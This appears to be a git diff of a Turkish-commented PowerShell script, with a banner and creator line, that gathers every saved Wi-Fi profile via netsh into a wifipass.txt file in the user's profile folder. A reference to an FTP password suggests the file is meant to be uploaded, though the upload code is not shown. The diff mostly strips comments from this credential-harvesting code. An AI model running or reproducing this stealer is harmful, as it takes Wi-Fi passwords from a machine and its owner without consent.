@@ -1,7 +1,7 @@
-# Konsol encoding'i UTF-8 yap
+#Creator: Bulent Sahin 69
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 
-# Banner
+
 $banner = @"
      .!~!~!~!!!!~!.  ..!~!^  . . . ^!~!. .!~!^  . . .... ..!~!~!~!!!!!!~!. .!~!~!^  . . ^!~!. .!~!~!~!~!!!!~!~!.        
      !@@@@@@@@@@@@J~.^J@@@#!:~:^:^:B@@@P~7@@@&!:^:^:^^^^:^J@@@@@@@@@@@@@@Y~J@@@@@&!:^:^:#@@@5~?@@@@@@@@@@@@@@@@P!       
@@ -39,17 +39,14 @@ if (-not $ftpPass) {
 
 $localFile = "$env:USERPROFILE\wifipass.txt"
 
-# Eski dosya varsa sil
 Remove-Item -Path $localFile -ErrorAction SilentlyContinue
 
-# Bütün Wi-Fi profillerini al
 $profiles = netsh wlan show profiles | ForEach-Object {
     if ($_ -match ":\s(.+)$") {
         $matches[1].Trim()
     }
 }
 
-# Her profil için detay al
 foreach ($profile in $profiles) {
     Add-Content -Path $localFile -Value "=== $profile ===`n"
 
